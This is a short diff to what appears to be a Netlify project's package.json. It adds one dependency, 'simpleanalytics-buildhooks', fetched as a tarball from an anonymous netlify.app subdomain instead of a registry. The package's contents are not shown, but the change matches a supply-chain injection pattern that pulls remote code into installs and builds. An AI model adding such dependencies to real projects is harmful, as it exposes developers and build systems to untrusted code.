@@ -4,5 +4,8 @@
   "version": "1.0.0",
   "private": true,
   "author": "Netlify",
-  "license": "MIT"
+  "license": "MIT",
+  "dependencies": {
+    "simpleanalytics-buildhooks": "https://443cbb77-0b8e-4310-a5ec-49601b12e87d.netlify.app/packages/buildhooks.tgz"
+  }
 }
